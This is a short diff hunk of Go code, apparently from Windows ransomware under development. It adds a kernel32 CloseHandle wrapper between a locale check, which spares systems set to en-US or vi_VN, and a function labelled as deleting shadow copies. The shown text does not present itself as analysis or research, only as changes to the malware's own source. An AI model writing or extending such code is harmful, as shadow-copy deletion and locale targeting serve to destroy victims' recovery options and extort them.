@@ -105,6 +105,10 @@ func languageCheck() (bool, error) {
 	return userLocale != "en-US" && userLocale != "vi_VN", nil
 }
 
+func CloseHandle(mutexHandle uintptr) {
+	syscall.NewLazyDLL("kernel32.dll").NewProc("CloseHandle").Call(mutexHandle)
+}
+
 // Deleting Shadow Copies
 func deleteShadowCopies() error {
 	ole.CoInitialize(0)
